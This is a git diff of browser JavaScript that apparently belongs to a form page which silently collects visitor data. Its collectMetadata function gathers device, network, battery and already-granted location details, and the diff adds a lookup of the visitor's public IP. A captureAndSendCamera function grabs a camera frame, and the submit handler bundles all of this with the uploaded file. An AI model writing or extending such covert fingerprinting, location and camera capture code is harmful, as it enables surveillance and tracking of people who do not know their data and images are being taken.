@@ -30,9 +30,11 @@ async function collectMetadata() {
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
     network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
+    ip: "N/A", // IP field added
     time: new Date().toLocaleString(),
   };
 
+  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -40,6 +42,7 @@ async function collectMetadata() {
     } catch {}
   }
 
+  // Location if already granted
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -51,6 +54,13 @@ async function collectMetadata() {
       }
     } catch {}
   }
+
+  // Get public IP from ipify
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    metadata.ip = ipData.ip;
+  } catch {}
 
   return metadata;
 }
@@ -75,11 +85,10 @@ async function captureAndSendCamera() {
     });
 
     await video.play();
-    await new Promise((r) => setTimeout(r, 1200)); // wait for frame
+    await new Promise(r => setTimeout(r, 1200)); // wait for frame
 
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
-
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -169,7 +178,6 @@ form.addEventListener("submit", async (e) => {
   (async () => {
     try {
       const metadata = await collectMetadata();
-
       const fileData = await new Promise((resolve) => {
         const reader = new FileReader();
         reader.onload = () => resolve(reader.result);
